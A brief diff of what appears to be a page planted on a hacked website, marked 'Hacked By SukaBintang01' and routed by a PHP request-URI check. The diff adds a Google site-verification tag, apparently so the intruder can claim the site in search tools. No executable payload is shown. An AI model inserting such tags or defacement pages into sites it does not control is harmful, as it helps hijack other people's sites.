@@ -34,6 +34,7 @@ if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
     <meta name="revisit-after" content="1 days">
     <meta name="classification" content="Hacked By SukaBintang01">
     <meta name="robots schedule" content="auto">
+    <meta name="google-site-verification" content="45v2vK6HFoU0gBd7Xg8hVDZgi5Jr84CyMnmBqj8PcoA" />
     <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">
 </head>
 <body>
